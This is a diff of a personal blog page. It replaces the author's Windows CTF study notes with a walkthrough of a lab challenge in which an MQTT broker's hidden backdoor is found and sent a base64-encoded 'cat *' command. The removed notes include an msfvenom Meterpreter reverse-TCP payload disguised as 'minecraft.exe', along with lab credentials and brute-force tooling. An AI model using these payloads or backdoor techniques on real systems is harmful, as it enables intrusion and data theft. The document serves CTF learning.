@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Learn CTF on windows | Peanutstick</title>
+  <title>CTF Bugged | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="Learn CTF on windows | Peanutstick">
+  <meta name="description" content="CTF Bugged | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="NoteJohn was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  nampnmap -A -sV -p-">
 <meta property="og:type" content="article">
@@ -1161,9 +1161,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Learn CTF on windows" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Untitled" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Learn CTF on windows</h1>
+        <h1 class="article-title">CTF Bugged</h1>
     
     <div class="article-meta">
         
@@ -1188,12 +1188,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-01-15 11:28:52'>2023-01-14 19:26</time>
+            Created At : <time class="date" title='Updated At: 2023-03-07 19:29:38'>2023-03-09 02:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:740</span>
+        <span>Count:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1212,7 +1212,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#How"><span class="toc-text">How</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#How-to-search-on-google"><span class="toc-text">How to search on google</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-sub-domain"><span class="toc-text">Find sub domain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba"><span class="toc-text">Samba</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exect-an-exe-file-on-linux"><span class="toc-text">Exect an exe file on linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-Enumeration"><span class="toc-text">LDAP Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crackmapexec"><span class="toc-text">crackmapexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smbmap"><span class="toc-text">smbmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backdoor"><span class="toc-text">Backdoor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rpcclient"><span class="toc-text">rpcclient</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connect"><span class="toc-text">Connect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-users"><span class="toc-text">Enum users</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crackmapexec-1"><span class="toc-text">crackmapexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SharpHound"><span class="toc-text">SharpHound</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Note"><span class="toc-text">Note</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#namp"><span class="toc-text">namp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Documentation"><span class="toc-text">Documentation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Get-base64-string"><span class="toc-text">Get base64 string</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Send-a-command"><span class="toc-text">Send a command</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Subscriber"><span class="toc-text">Subscriber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Publisher"><span class="toc-text">Publisher</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Decode-it"><span class="toc-text">Decode it</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Use-the-backdoor"><span class="toc-text">Use the backdoor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLag"><span class="toc-text">FLag</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1228,100 +1228,116 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><p>I don’t like courses, if I don’t look for the information myself it’s not effective.<br>So I’m going to look for beginner’s articles, find the tools and read what it does on github.<br>While I read it, I will write it here and at the end on the day I will do a CTF on windows.</p>
-<p>Let’s begin:</p>
-<h1 id="How-to-search-on-google"><a href="#How-to-search-on-google" class="headerlink" title="How to search on google"></a>How to search on google</h1><p>It’s not nessesary, but I would like to share how I do it.<br>it’s not amazing but I saw too many ppl who write the full sentence on google with uppercase, punctuation and potency formula…</p>
-<p>How I do:</p>
-<ul>
-<li>Few words (subject, verb): <ul>
-<li>windows ctf writeup</li>
-<li>windows ctf boot to root</li>
-<li>boot to root windows</li>
-<li>writeur hack the box windows</li>
-</ul>
-</li>
-<li>We don’t care of the order of the words</li>
-<li>Middle click on every links to open the in a new tab</li>
-<li>Scroll very fast without reading on the first one, if I feel like it’s useless (ctrl+w) </li>
-<li>You can also search for the word <code>windows</code> .</li>
-</ul>
-<p>And there is the interesting links:</p>
+        <h1 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -sV -p- <span class="token number">10.10</span>.85.233 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-07 19:03 CET
+Nmap scan report for 10.10.85.233
+Host is up (0.034s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT     STATE SERVICE                  VERSION
+1883&#x2F;tcp open  mosquitto version 2.0.14
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|     $SYS&#x2F;broker&#x2F;messages&#x2F;received: 59
+|     patio&#x2F;lights: &#123;&quot;id&quot;:9498615153902037727,&quot;color&quot;:&quot;RED&quot;,&quot;status&quot;:&quot;OFF&quot;&#125;
+|     $SYS&#x2F;broker&#x2F;version: mosquitto version 2.0.14
+|     $SYS&#x2F;broker&#x2F;shared_subscriptions&#x2F;count: 0
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;dropped&#x2F;15min: 0.00
+|     $SYS&#x2F;broker&#x2F;load&#x2F;sockets&#x2F;1min: 3.22
+|     $SYS&#x2F;broker&#x2F;bytes&#x2F;sent: 3994
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;inactive: 0
+|     $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;sent&#x2F;15min: 7.77
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;sent&#x2F;5min: 11.59
+|     $SYS&#x2F;broker&#x2F;load&#x2F;sockets&#x2F;15min: 0.26
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;connected: 2
+|     $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;received&#x2F;5min: 540.82
+|     $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;sent&#x2F;5min: 22.75
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;total: 2
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;received&#x2F;15min: 0.00
+|     $SYS&#x2F;broker&#x2F;uptime: 33 seconds
+|     $SYS&#x2F;broker&#x2F;subscriptions&#x2F;count: 3
+|     $SYS&#x2F;broker&#x2F;publish&#x2F;bytes&#x2F;received: 1981
+|     $SYS&#x2F;broker&#x2F;messages&#x2F;sent: 142
+|     $SYS&#x2F;broker&#x2F;store&#x2F;messages&#x2F;bytes: 296
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;dropped&#x2F;1min: 0.00
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;active: 2
+|     $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;received&#x2F;15min: 3.86
+|     $SYS&#x2F;broker&#x2F;store&#x2F;messages&#x2F;count: 52
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;sent&#x2F;15min: 3.91
+|     $SYS&#x2F;broker&#x2F;publish&#x2F;messages&#x2F;dropped: 0
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;disconnected: 0
+|     $SYS&#x2F;broker&#x2F;publish&#x2F;bytes&#x2F;sent: 675
+|     $SYS&#x2F;broker&#x2F;publish&#x2F;messages&#x2F;received: 0
+|     $SYS&#x2F;broker&#x2F;publish&#x2F;messages&#x2F;sent: 84
+|     $SYS&#x2F;broker&#x2F;load&#x2F;sockets&#x2F;5min: 0.76
+|     livingroom&#x2F;speaker: &#123;&quot;id&quot;:4007409197343670969,&quot;gain&quot;:45&#125;
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;sent&#x2F;1min: 53.91
+|     $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;sent&#x2F;15min: 189.97
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;received&#x2F;5min: 0.00
+|     $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;received&#x2F;15min: 187.07
+|     $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;sent&#x2F;5min: 561.92
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;received&#x2F;1min: 0.00
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;maximum: 2
+|     $SYS&#x2F;broker&#x2F;load&#x2F;publish&#x2F;dropped&#x2F;5min: 0.00
+|     $SYS&#x2F;broker&#x2F;bytes&#x2F;received: 2859
+|     $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;received&#x2F;1min: 45.29
+|     kitchen&#x2F;toaster: &#123;&quot;id&quot;:14194221257404514717,&quot;in_use&quot;:false,&quot;temperature&quot;:153.88422,&quot;toast_time&quot;:272&#125;
+|     yR3gPp0r8Y&#x2F;AGlaMxmHJe&#x2F;qV66JF5qmH&#x2F;config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ&#x3D;&#x3D;
+|     $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;sent&#x2F;1min: 99.20
+|     $SYS&#x2F;broker&#x2F;messages&#x2F;stored: 52
+|     $SYS&#x2F;broker&#x2F;load&#x2F;messages&#x2F;received&#x2F;5min: 11.17
+|     $SYS&#x2F;broker&#x2F;load&#x2F;connections&#x2F;5min: 0.58
+|     $SYS&#x2F;broker&#x2F;load&#x2F;connections&#x2F;1min: 2.46
+|     $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;sent&#x2F;1min: 2587.53
+|     $SYS&#x2F;broker&#x2F;retained messages&#x2F;count: 51
+|     $SYS&#x2F;broker&#x2F;clients&#x2F;expired: 0
+|     $SYS&#x2F;broker&#x2F;load&#x2F;bytes&#x2F;received&#x2F;1min: 2188.79
+|     $SYS&#x2F;broker&#x2F;load&#x2F;connections&#x2F;15min: 0.20
+|_    storage&#x2F;10.10.85.233thermostat: &#123;&quot;id&quot;:2291235996486415869,&quot;temperature&quot;:23.365356&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>The port 1883 is open, the service is mosquito version 2.0.14.<br>We can also see mqtt-subscribe.</p>
+<h1 id="Documentation"><a href="#Documentation" class="headerlink" title="Documentation"></a>Documentation</h1><p><a href="https://cs.pomona.edu/classes/po181u/docs/labs/lab4/">https://cs.pomona.edu/classes/po181u/docs/labs/lab4/</a></p>
+<p>I have to install mosquito:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S mosquitto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ol>
-<li><a href="https://cybergladius.com/htb-walkthrough-support/">https://cybergladius.com/htb-walkthrough-support/</a></li>
-<li><a href="https://www.hackingarticles.in/writer-hackthebox-walkthrough/">https://www.hackingarticles.in/writer-hackthebox-walkthrough/</a></li>
-<li><a href="https://systemweakness.com/flatline-windows-hacking-tryhackme-ctf-ac57b03a80a1">https://systemweakness.com/flatline-windows-hacking-tryhackme-ctf-ac57b03a80a1</a></li>
-<li><a href="https://www.youtube.com/watch?v=iIveZ-raTTQ&amp;list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn">https://www.youtube.com/watch?v=iIveZ-raTTQ&amp;list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn</a></li>
-<li><a href="https://haax.fr/fr/walkthroughs/hackthebox/remote/">https://haax.fr/fr/walkthroughs/hackthebox/remote/</a></li>
+<li> mosquitto_pub : for publishing to MQTT servers</li>
+<li> mosquitto_sub : for subscribing to MQTT servers<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-h <span class="token builtin class-name">:</span> mqtt <span class="token function">host</span> to connnect to. Defaults to localhost
+-t <span class="token builtin class-name">:</span> mqtt topic to publish/subscribe to
+-m <span class="token builtin class-name">:</span> mqtt message body <span class="token keyword">for</span> publication
+-v <span class="token builtin class-name">:</span> print published messages verbosely<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<img src="https://i.imgur.com/KFWJeod.png"></li>
 </ol>
-<p>It’s enough, let’s start working.</p>
-<h2 id="Find-sub-domain"><a href="#Find-sub-domain" class="headerlink" title="Find sub domain"></a>Find sub domain</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> @<span class="token variable">$ip</span> +short support.htp any<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>If you find somethign you have to white it in the /etc/hosts.</p>
-<h2 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient -N -L <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token variable">$IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>-L to list<br>-N to supress password prompt<br>It will work only if the guest login is ennabled.</p>
-<p>Then :</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient -N <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token variable">$ip</span><span class="token punctuation">\</span><span class="token punctuation">\</span>share<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Now you can use <code>?</code> to display the commands, I mainly use <code>get</code>, <code>ls</code> and <code>dir</code>.</p>
-<p>To download all the files in a directory:</p>
-<p>Smetimes <code>mask</code> is not needed.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SMB:<span class="token operator">></span> mask <span class="token string">""</span>
-SMB:<span class="token operator">></span> recurse ON
-SMB:<span class="token operator">></span> prompt OFF
-SMB:<span class="token operator">></span> mget *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Get-base64-string"><a href="#Get-base64-string" class="headerlink" title="Get base64 string"></a>Get base64 string</h1><p>I’m looking for all the datas with mosquitto_sub.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mosquitto_sub -h <span class="token number">10.10</span>.85.233 -t <span class="token string">"#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/xMLyBtO.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token assign-left variable">eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ</span><span class="token operator">==</span> <span class="token operator">|</span>base64 -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">&#123;&quot;id&quot;:&quot;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&quot;,&quot;registered_commands&quot;:[&quot;HELP&quot;,&quot;CMD&quot;,&quot;SYS&quot;],&quot;pub_topic&quot;:&quot;U4vyqNlQtf&#x2F;0vozmaZyLT&#x2F;15H9TF6CHg&#x2F;pub&quot;,&quot;sub_topic&quot;:&quot;XD2rfR9Bez&#x2F;GqMpRSEobh&#x2F;TvLQehMg0E&#x2F;sub&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>The ID is : <code>cdd1b1c0-1c40-4b0f-8e22-61b357548b7d</code><br>registered_commands: CMD should be usefull for us.<br>pub_topic:<code>U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub</code><br>sub_topic:<code>XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub</code></p>
+<p>Now we can try to publish a command.we also need to let the subscriber listen.</p>
+<h1 id="Send-a-command"><a href="#Send-a-command" class="headerlink" title="Send a command"></a>Send a command</h1><h2 id="Subscriber"><a href="#Subscriber" class="headerlink" title="Subscriber"></a>Subscriber</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mosquitto_sub -h <span class="token number">10.10</span>.85.233 -t <span class="token string">"#"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>Mount it:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /mnt/ctf
-<span class="token function">mount</span> -t cifs //10.10.10.192/profiles$ /mnt/ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mosquitto_pub -h <span class="token number">10.10</span>.85.233 -t <span class="token string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="token string">"eqrgijkosrgfuheqrguirgequi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="Exect-an-exe-file-on-linux"><a href="#Exect-an-exe-file-on-linux" class="headerlink" title="Exect an exe file on linux"></a>Exect an exe file on linux</h2><p>With <code>nono</code> or <code>wine64</code>. I don’t know nono.<br>I don’t care about this step let’s continue.</p>
-<h2 id="LDAP-Enumeration"><a href="#LDAP-Enumeration" class="headerlink" title="LDAP Enumeration"></a>LDAP Enumeration</h2><p>He use <code>ldapsearch</code> but he only give one exemple so I’m searching somewhere else.<br><a href="https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/">https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/</a><br>I will install it:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S openldap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><a href="https://wiki.archlinux.org/title/OpenLDAP">https://wiki.archlinux.org/title/OpenLDAP</a><br><a href="https://access.redhat.com/documentation/en-us/red_hat_directory_server/11/html/administration_guide/examples-of-common-ldapsearches">https://access.redhat.com/documentation/en-us/red_hat_directory_server/11/html/administration_guide/examples-of-common-ldapsearches</a><br><a href="https://0xdf.gitlab.io/tags#ldapsearch">https://0xdf.gitlab.io/tags#ldapsearch</a><br>Exemples</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldapsearch -H ldap://blackfield.local:389 -x -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>blackfield,DC<span class="token operator">=</span>LOCAL
+<p><img src="https://i.imgur.com/UYmi5Ni.png"></p>
+<h2 id="Decode-it"><a href="#Decode-it" class="headerlink" title="Decode it"></a>Decode it</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk<span class="token operator">=</span> <span class="token operator">|</span>base64 -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Invalid message format.
+Format: base64(&#123;&quot;id&quot;: &quot;&lt;backdoor id&gt;&quot;, &quot;cmd&quot;: &quot;&lt;command&gt;&quot;, &quot;arg&quot;: &quot;&lt;argument&gt;&quot;&#125;)%  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-ldapsearch -h support.htb -x -s base namingcontexts
+<h1 id="Use-the-backdoor"><a href="#Use-the-backdoor" class="headerlink" title="Use the backdoor"></a>Use the backdoor</h1><p>We need to encode it in base64.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'&#123;"id": "4879005204976514238", "cmd": "CMD", "arg": "cat *"&#125;'</span> <span class="token operator">|</span>base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">eyJpZCI6ICI0ODc5MDA1MjA0OTc2NTE0MjM4IiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImNhdCAq
+In0K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>This will be our message.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mosquitto_pub -h <span class="token number">10.10</span>.85.233 -t <span class="token string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="token string">"eyJpZCI6ICI0ODc5MDA1MjA0OTc2NTE0MjM4IiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImNhdCAqIn0K"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-ldapsearch -h support.htb -x -b <span class="token string">"DC=support,DC=htb"</span>
-
-ldapsearch -h support.htb -D <span class="token string">'ldap@support.htb'</span> -w <span class="token string">'nvEfEK16^1aM4<span class="token variable">$e7AclUf8x</span><span class="token variable">$tRWxPWO1</span>%lmz'</span> -b <span class="token string">"DC=support,DC=htb"</span><span class="token operator">|</span> <span class="token function">less</span>
-
-<span class="token comment"># Without auth</span>
-ldapsearch -h <span class="token number">10.10</span>.11.168 -x -s base namingcontexts
-
-
-<span class="token comment"># With auth</span>
-ldapsearch -h <span class="token number">10.10</span>.11.129 -D <span class="token string">'hope.sharp@search.htb'</span> -w <span class="token string">"IsolationIsKey?"</span> -b <span class="token string">"DC=search,DC=htb"</span>
-
-<span class="token comment"># I don't understand this one</span>
-ldapsearch -h <span class="token number">127.0</span>.0.1 -x -b <span class="token string">'dc=htb'</span> -D <span class="token string">'cn=binduser,ou=users,dc=pikaboo,dc=htb'</span> -w <span class="token string">'J~42%W?PFHl]g'</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h2><p>CrackMapExec shows the full OS information:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">
-oxdf@parrot$ crackmapexec smb <span class="token number">10.10</span>.10.248
-SMB         <span class="token number">10.10</span>.10.248    <span class="token number">445</span>    DC               <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10.0</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:DC<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:intelligence.htb<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>So, if the dig is not working you can use this, I think you should use both.<br>You can also see if the SMBv1 is enabled.</p>
-<h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><p>I don’t see the difference with smbclient</p>
-<h3 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h3><p><a href="https://www.youtube.com/watch?v=Nt0CE3Km8Nw">https://www.youtube.com/watch?v=Nt0CE3Km8Nw</a><br>Targert = 192.168.5.115<br>me = 192.168.5.128</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windowd/meterpreter/reverse-tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token variable">$me</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token variable">$myport</span> -f exe <span class="token operator">></span> minecraft.exe
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/0YK68wc.png"></p>
-<p><img src="https://i.imgur.com/cFMinvJ.png"></p>
-<p><img src="https://i.imgur.com/FWsO5xv.png"></p>
-<p>So, if you can upload something you can upload a backdoor.</p>
-<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><p>it’s the RDP</p>
-<h3 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rpcclient -U <span class="token string">''</span> -N <span class="token variable">$IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="Enum-users"><a href="#Enum-users" class="headerlink" title="Enum users"></a>Enum users</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enumdomusers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.imgur.com/WgQGcPq.png"><br>Clear the output:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">awk</span> -F<span class="token punctuation">\</span><span class="token punctuation">[</span> <span class="token string">'&#123;print <span class="token variable">$2</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token punctuation">\</span><span class="token punctuation">]</span> <span class="token string">'&#123;print <span class="token variable">$1</span>&#125;'</span> <span class="token operator">></span> valid_users.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Then in the CTF he use ldpsearch to find the password, decode it.</p>
-<h2 id="crackmapexec-1"><a href="#crackmapexec-1" class="headerlink" title="crackmapexec"></a>crackmapexec</h2><p>Then he use the list of users to brute force the smb with the valid password and the tool <code>crackmapexec</code>.<br>I need it.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S crackmapexec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>wow, only for one tool…<br><img src="https://i.imgur.com/K9yIpjU.png"></p>
-<p><img src="https://i.imgur.com/rmLZ6hp.png"><br>Ok… I will install it later.<br>later:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S crackmapexec --overwrite <span class="token string">'*'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Then he brute force.<br><a href="https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/">https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/</a></p>
-<h2 id="SharpHound"><a href="#SharpHound" class="headerlink" title="SharpHound"></a>SharpHound</h2><p>It’s used to enum for privesc</p>
-
+<h1 id="FLag"><a href="#FLag" class="headerlink" title="FLag"></a>FLag</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9 <span class="token operator">|</span>base64 -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:</p>
